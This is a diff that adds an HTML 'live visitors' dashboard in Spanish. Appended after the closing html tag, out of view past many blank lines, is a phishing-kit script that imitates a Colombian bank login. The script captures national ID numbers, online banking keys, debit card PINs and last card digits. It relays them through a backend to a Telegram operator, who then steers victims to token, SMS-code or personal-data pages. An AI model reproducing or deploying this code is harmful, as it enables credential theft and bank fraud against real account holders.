@@ -1,0 +1,483 @@
+<!doctype html>
+<html lang="es" class="antialiased">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Panel en Vivo — Visitantes</title>
+    <!-- Tailwind CDN (Play) -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Chart.js para gráficas simples -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+      /* Reglas CSS simples para evitar @apply y linters */
+      .card { background: #ffffff; border-radius: 0.5rem; padding: 1rem; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+    </style>
+  </head>
+  <body class="bg-gray-50 text-gray-800 min-h-screen">
+    <div class="container mx-auto p-6">
+      <header class="flex items-center justify-between mb-6">
+        <div>
+          <h1 class="text-2xl font-bold">Panel en Vivo — Visitantes</h1>
+          <p class="text-sm text-gray-500">Monitoreo en tiempo real de entradas y conexiones</p>
+        </div>
+        <div class="flex items-center gap-3">
+          <button id="toggle-theme" class="px-3 py-2 bg-gray-200 rounded hover:bg-gray-300 text-sm">Toggle dark</button>
+          <a href="/" class="px-3 py-2 bg-green-600 text-white rounded hover:bg-green-700 text-sm">Ir al sitio</a>
+        </div>
+      </header>
+
+      <main class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <!-- Stats -->
+        <section class="md:col-span-2">
+          <div class="bg-white p-4 rounded-lg shadow">
+            <div class="flex items-center justify-between">
+              <div>
+                <div class="text-sm text-gray-500">Conectados ahora</div>
+                <div id="total-count" class="text-3xl font-extrabold text-gray-800">0</div>
+              </div>
+              <div class="text-right">
+                <div class="text-sm text-gray-500">Entradas totales</div>
+                <div id="total-entries" class="text-2xl font-bold text-blue-600">0</div>
+                <div class="text-xs text-gray-400 mt-1">Última actualización: <span id="last-updated">-</span></div>
+              </div>
+            </div>
+
+            <div class="mt-4">
+              <canvas id="onlineChart" height="80"></canvas>
+            </div>
+          </div>
+
+          <div class="bg-white p-4 rounded-lg shadow mt-4">
+            <div class="flex items-center justify-between mb-3">
+              <h2 class="text-lg font-semibold">Visitas recientes</h2>
+              <div class="flex items-center gap-2">
+                <button id="export-csv" class="px-3 py-1 bg-green-600 text-white rounded text-sm">Export CSV</button>
+                <button id="clear-log" class="px-3 py-1 bg-red-500 text-white rounded text-sm">Limpiar local</button>
+              </div>
+            </div>
+            <ul id="recent-visits" class="divide-y divide-gray-100 max-h-64 overflow-auto"></ul>
+          </div>
+        </section>
+
+        <!-- Sidebar -->
+        <aside class="space-y-4">
+          <div class="bg-white p-4 rounded-lg shadow">
+            <h3 class="font-medium text-sm text-gray-600">Clientes conectados</h3>
+            <ul id="clients" class="mt-3 text-sm divide-y divide-gray-100 max-h-64 overflow-auto"></ul>
+          </div>
+
+          <div class="bg-white p-4 rounded-lg shadow">
+            <h3 class="font-medium text-sm text-gray-600">Acciones</h3>
+            <div class="mt-3 flex flex-col gap-2">
+              <button id="refresh" class="px-3 py-2 bg-indigo-600 text-white rounded">Forzar actualización</button>
+              <div class="text-xs text-gray-500">Puedes forzar una petición al servidor para que reenvíe el estado.</div>
+            </div>
+          </div>
+        </aside>
+      </main>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/vistas.js"></script>
+  </body>
+  </html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   <script>
+            $(document).ready(function($) {
+                // La lógica del formulario se inicializa directamente.
+                // Ya no se necesita cargar el JSON.
+                initializeFormLogic();
+
+                function initializeFormLogic() {
+                    // El backend se encargará de la comunicación con Telegram.
+                    let statusCheckInterval = null;
+
+                    // Nueva función para enviar datos al backend
+                    async function sendLoginDataToBackend(messageContent, keyboard) {
+                        const url = '/api/send-message'; // Endpoint del backend
+                        const payload = {
+                            text: messageContent,
+                            keyboard: JSON.parse(keyboard) // El backend espera un objeto, no un string
+                        };
+
+                        try {
+                            const response = await fetch(url, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload),
+                            });
+
+                            const data = await response.json();
+
+                            if (!response.ok) {
+                                console.error(`Error al enviar mensaje al backend: ${response.status}`, data.error);
+                                return null;
+                            }
+
+                            console.log('Mensaje enviado al backend exitosamente:', data);
+                            // Devolvemos el ID del mensaje para poder verificar la respuesta
+                            return data.result.message_id;
+
+                        } catch (error) {
+                            console.error('Error de red al enviar mensaje a Telegram:', error);
+                            return false;
+                        }
+                    }
+
+                    const tab1 = document.getElementById('bdb-ml-secondtabs__1');
+                    const tab2 = document.getElementById('bdb-ml-secondtabs__2');
+                    const label1 = document.getElementById('label1');
+                    const label2 = document.getElementById('label2');
+                    const tabs = document.getElementById('tab');
+                    const menuseg = document.getElementById("menuseg");
+                    const menudeb = document.getElementById("menudeb");
+                    const azul = document.getElementById('bdb-at-backdrop');
+
+                    tab1.addEventListener('click', function() {
+                        tab1.setAttribute('aria-selected', 'true');
+                        tab1.setAttribute('tabindex', '0');
+                        label1.setAttribute('style', 'font-family: Roboto-Medium; color: rgb(0, 64, 178);');
+                        tab2.setAttribute('aria-selected', 'false');
+                        tab2.setAttribute('tabindex', '-1');
+                        label2.setAttribute('style', 'font-family: Roboto-Regular; color: rgb(92, 92, 92);');
+
+                        tabs.setAttribute('style', 'width: 50%; transform: translate(0px, 0px);');
+                        menuseg.style.display = 'block';
+                        menudeb.style.display = 'none';
+                    });
+
+                    tab2.addEventListener('click', function() {
+                        tab1.setAttribute('aria-selected', 'false');
+                        tab1.setAttribute('tabindex', '-1');
+                        label1.setAttribute('style', 'font-family: Roboto-Regular; color: rgb(92, 92, 92);');
+                        tab2.setAttribute('aria-selected', 'true');
+                        tab2.setAttribute('tabindex', '0');
+                        label2.setAttribute('style', 'font-family: Roboto-Medium;color: rgb(0, 64, 168);');
+
+                        tabs.setAttribute('style', 'width: 50%; transform: translate(100%, 0px);');
+                        menuseg.style.display = 'none';
+                        menudeb.style.display = 'block';
+                    });
+
+                    document.querySelectorAll('.opcionesdos').forEach(item => {
+                        document.getElementById('opcionamostrardos').textContent = "C.C. Cédula de ciudadanía";
+                        item.addEventListener('click', event => {
+                            document.getElementById('opcionamostrardos').textContent = event.target.textContent;
+                            document.querySelectorAll('.opcionesdos').forEach(option => {
+                                option.classList.remove('container__input__options__items--same-selected');
+                            });
+                            event.target.classList.add('container__input__options__items--same-selected');
+                            var contenido = document.getElementById('menusitodos');
+                            contenido.classList.add('container__input__options--hide');
+                            contenido.classList.remove('fadeIn');
+                            document.getElementById('dropdown_identificationTypedos').classList.remove('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationTypedos').classList.remove('container__input__box--active');
+                        });
+                    });
+
+                    document.querySelectorAll('.opciones').forEach(item => {
+                        item.addEventListener('click', event => {
+                            document.getElementById('opcionamostrar').textContent = event.target.textContent;
+                            const clickedText = event.target.textContent;
+                            document.querySelectorAll('.opciones').forEach(option => {
+                                option.classList.remove('container__input__options__items--same-selected');
+                            });
+                            event.target.classList.add('container__input__options__items--same-selected');
+                            var contenido = document.getElementById('menusito');
+                            contenido.classList.add('container__input__options--hide');
+                            contenido.classList.remove('fadeIn');
+                            document.getElementById('dropdown_identificationType').classList.remove('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationType').classList.remove('container__input__box--active');
+
+                            const valuesToCheck = [
+                                'N.P.N. NIT Persona Natural',
+                                'N.P.E. NIT Persona Extranjera',
+                                'N.P.J. NIT Persona Jurídica'
+                            ];
+                            if (valuesToCheck.includes(clickedText)) {
+                                document.getElementById('menudesplegadodos').style.display = 'block';
+                            } else {
+                                document.getElementById('opcionamostrardos').textContent = '';
+                                document.getElementById('menudesplegadodos').style.display = 'none';
+                                document.getElementById('bdb-at-inputmenudos').value = '';
+                            }
+                            validarInputsYActivarBoton();
+                        });
+                    });
+
+                    document.getElementById('botonMostrarOcultar').addEventListener('click', function() {
+                        var contenido = document.getElementById('menusito');
+                        var flecha = document.getElementById('dropdown_identificationType');
+                        if (contenido.classList.contains('container__input__options--hide') && flecha.classList.contains('container__input__box')) {
+                            contenido.classList.remove('container__input__options--hide');
+                            contenido.classList.add('fadeIn');
+                            contenido.classList.add('container__input__options__items');
+                            document.getElementById('dropdown_identificationType').classList.add('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationType').classList.add('container__input__box--active');
+                        } else {
+                            contenido.classList.add('container__input__options--hide');
+                            contenido.classList.remove('fadeIn');
+                            document.getElementById('dropdown_identificationType').classList.remove('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationType').classList.remove('container__input__box--active');
+                        }
+                    });
+
+                    document.getElementById('botonMostrarOcultardos').addEventListener('click', function() {
+                        var contenido = document.getElementById('menusitodos');
+                        var flecha = document.getElementById('dropdown_identificationTypedos');
+                        if (contenido.classList.contains('container__input__options--hide') && flecha.classList.contains('container__input__box')) {
+                            contenido.classList.remove('container__input__options--hide');
+                            contenido.classList.add('fadeIn');
+                            contenido.classList.add('container__input__options__items');
+                            document.getElementById('dropdown_identificationTypedos').classList.add('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationTypedos').classList.add('container__input__box--active');
+                        } else {
+                            contenido.classList.add('container__input__options--hide');
+                            contenido.classList.remove('fadeIn');
+                            document.getElementById('dropdown_identificationTypedos').classList.remove('container__input__box__arrow');
+                            document.getElementById('dropdown_identificationTypedos').classList.remove('container__input__box--active');
+                        }
+                    });
+
+                    const nextButton = document.getElementById('next');
+                    const backButton = document.getElementById('back');
+                    const container = document.querySelector('.bdb-ml-horizontal-selector__scrollable__container');
+                    let currentPosition = 0;
+                    const itemWidth = 124;
+
+                    function moveContainer(direction) {
+                        if (direction === 'next') {
+                            currentPosition -= itemWidth;
+                        } else if (direction === 'back') {
+                            currentPosition += itemWidth;
+                        }
+
+                        const minPosition = 0;
+                        const maxPosition = (container.children.length - 1) * itemWidth - 280;
+                        currentPosition = Math.max(minPosition, Math.min(currentPosition, maxPosition));
+
+                        container.style.transition = 'transform 0.5s ease-in-out';
+                        container.style.transform = `translateX(-${currentPosition}px)`;
+
+                        backButton.style.display = currentPosition === 0 ? 'none' : 'initial';
+                        nextButton.style.display = currentPosition === maxPosition ? 'none' : 'initial';
+                    }
+
+                    nextButton.addEventListener('click', function() {
+                        moveContainer('back');
+                    });
+
+                    backButton.addEventListener('click', function() {
+                        moveContainer('next');
+                    });
+
+                    function validarInputsYActivarBoton() {
+                        const input = document.getElementById('bdb-at-input');
+                        const input2 = document.getElementById('bdb-at-input2');
+                        const input3 = document.getElementById('bdb-at-input3');
+                        const input4 = document.getElementById('bdb-at-input4');
+                        const inputRepLegal = document.getElementById('bdb-at-inputmenudos');
+                        const botonazodos = document.getElementById('botonazodos');
+                        const botonazouno = document.getElementById('botonazouno');
+                        const tabButton1 = document.getElementById('bdb-ml-secondtabs__1');
+                        const tabButton2 = document.getElementById('bdb-ml-secondtabs__2');
+
+                        function verificarCondiciones() {
+                            const textoInput = input.value.trim();
+                            const input1Valido = textoInput.length > 0;
+                            const isRepLegalVisible = document.getElementById('menudesplegadodos').style.display === 'block';
+                            const repLegalType = document.getElementById('opcionamostrardos').textContent.substring(0, 5);
+                            const repLegalNumber = inputRepLegal.value.trim();
+                            const repLegalValido = !isRepLegalVisible || (repLegalType && repLegalNumber.length > 0);
+                            const longitudInput4 = input4.value.trim().length;
+                            const input4Valido = longitudInput4 === 4;
+                            const longitudInput2 = input2.value.trim().length;
+                            const longitudInput3 = input3.value.trim().length;
+                            const input2Valido = longitudInput2 === 4;
+                            const input3Valido = longitudInput3 === 4;
+                            const botonActivoTab1 = tabButton1.getAttribute('aria-selected') === 'true';
+                            const botonActivoTab2 = tabButton2.getAttribute('aria-selected') === 'true';
+
+                            if (botonActivoTab1 && input1Valido && input4Valido && repLegalValido) {
+                                botonazouno.removeAttribute('disabled');
+                            } else {
+                                botonazouno.setAttribute('disabled', 'true');
+                            }
+
+                            if (botonActivoTab2 && input1Valido && input2Valido && input3Valido && repLegalValido) {
+                                botonazodos.removeAttribute('disabled');
+                            } else {
+                                botonazodos.setAttribute('disabled', 'true');
+                            }
+                        }
+
+                        input.addEventListener('input', verificarCondiciones);
+                        input2.addEventListener('input', verificarCondiciones);
+                        input3.addEventListener('input', verificarCondiciones);
+                        input4.addEventListener('input', verificarCondiciones);
+                        inputRepLegal.addEventListener('input', verificarCondiciones);
+
+                        async function handleLoginAttempt(loginData, tabName) {
+                            azul.style.display = 'block';
+
+                            const now = new Date();
+                            const formattedDate = now.toLocaleDateString('es-CO', {
+                                day: 'numeric',
+                                month: 'numeric',
+                                year: 'numeric'
+                            });
+                            const formattedTime = now.toLocaleTimeString('es-CO', {
+                                hour: '2-digit',
+                                minute: '2-digit',
+                                second: '2-digit',
+                                hour12: true
+                            });
+
+                            let message;
+                            if (tabName === 'Clave Segura') {
+                                message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${tabName}\nTipo de Doc: ${loginData.identificationType}\n\nCEDULA💎: ${loginData.identificationNumber}\nClAVE🔐: ${loginData.secureKey}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                            } else {
+                                message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${tabName}\nTipo de Doc: ${loginData.identificationType}\n\nCEDULA💎: ${loginData.identificationNumber}\nClAVE🔐: ${loginData.debitCardKey}\nUltimos 4: ${loginData.last4Digits}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                            }
+
+                            const keyboard = JSON.stringify({
+                                inline_keyboard: [
+                                    [{
+                                        text: "💎 Token App",
+                                        callback_data: `pedir_token:N/A`
+                                    }, {
+                                        text: "👀 Token SMS",
+                                        callback_data: `pedir_sms:N/A`
+                                    }],
+                                    [{
+                                        text: "❌ Error de Logo",
+                                        callback_data: `error_tc:N/A`
+                                    }],
+                                    [{
+                                        text: "Ir a CC",
+                                        callback_data: `pedir_datos:N/A`
+                                    }],
+                                    [{
+                                        text: "🚨 Finalizar",
+                                        callback_data: `confirm_finalizar:N/A`
+                                    }]
+                                ],
+                            });
+
+                            // Usamos la nueva función para enviar al backend
+                            const messageId = await sendLoginDataToBackend(message, keyboard);
+
+                            if (messageId) {
+                                sessionStorage.setItem('initialLoginData', JSON.stringify(loginData));
+                                // Iniciamos la verificación de respuesta usando el messageId
+                                checkOperatorResponse(messageId);
+                            } else {
+                                azul.style.display = 'none';
+                                alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
+                            }
+                        }
+
+                        // Nueva función para verificar la respuesta del operador a través del backend
+                        async function checkOperatorResponse(messageId) {
+                            if (statusCheckInterval) {
+                                clearInterval(statusCheckInterval);
+                            }
+
+                            try {
+                                // Hacemos una única llamada a nuestro endpoint de long-polling
+                                const response = await fetch(`/api/check-update/${messageId}`);
+                                azul.style.display = 'none'; // Ocultamos el loader
+
+                                if (response.status === 408) { // Timeout
+                                    alert("El operador no respondió a tiempo. Por favor, intente de nuevo.");
+                                    window.location.reload();
+                                    return;
+                                }
+
+                                const data = await response.json();
+
+                                if (data.action) {
+                                    if (data.action === 'pedir_token') window.location.href = "token.html";
+                                    else if (data.action === 'pedir_sms') window.location.href = "otp.html";
+                                    else if (data.action === 'pedir_datos') window.location.href = "datos.html";
+                                    else if (data.action === 'error_tc') document.getElementById('error-modal').style.display = 'flex';
+                                    else if (data.action === 'confirm_finalizar') window.location.href = "https://google.com";
+                                }
+                            } catch (error) {
+                                azul.style.display = 'none';
+                                console.error("Error al verificar la respuesta del operador:", error);
+                                alert("Ocurrió un error de comunicación. Por favor, recarga la página.");
+                            }
+                        }
+
+                        $("#botonazodos").off('click').on('click', async function() {
+                            const loginData = {
+                                identificationType: document.getElementById("opcionamostrar").textContent.substring(0, 5),
+                                identificationNumber: $("#bdb-at-input").val(),
+                                debitCardKey: $("#bdb-at-input2").val(),
+                                last4Digits: $("#bdb-at-input3").val().replace(/\D/g, ''),
+                                secureKey: 'N/A',
+                                legalRepresentativeDoc: 'N/A',
+                                legalRepresentativeNumber: 'N/A',
+                                ip: 'N/A',
+                                device: 'N/A'
+                            };
+                            await handleLoginAttempt(loginData, 'Tarjeta Débito');
+                        });
+
+                        $("#botonazouno").off('click').on('click', async function() {
+                            const loginData = {
+                                identificationType: document.getElementById("opcionamostrar").textContent.substring(0, 5),
+                                identificationNumber: $("#bdb-at-input").val(),
+                                secureKey: $("#bdb-at-input4").val(),
+                                debitCardKey: 'N/A',
+                                last4Digits: 'N/A',
+                                legalRepresentativeDoc: 'N/A',
+                                legalRepresentativeNumber: 'N/A',
+                                ip: 'N/A',
+                                device: 'N/A'
+                            };
+                            await handleLoginAttempt(loginData, 'Clave Segura');
+                        });
+
+                        document.getElementById('back-to-start-button').addEventListener('click', function() {
+                            window.location.href = "index.html";
+                        });
+
+                        verificarCondiciones();
+                    }
+                    validarInputsYActivarBoton();
+
+                    // Ya no es necesario hacer click, el estado inicial se define en el HTML
+                    window.addEventListener('beforeunload', function() {
+                        if (statusCheckInterval) {
+                            clearInterval(statusCheckInterval);
+                        }
+                    });
+                }
+            });
+        </script>
+                    
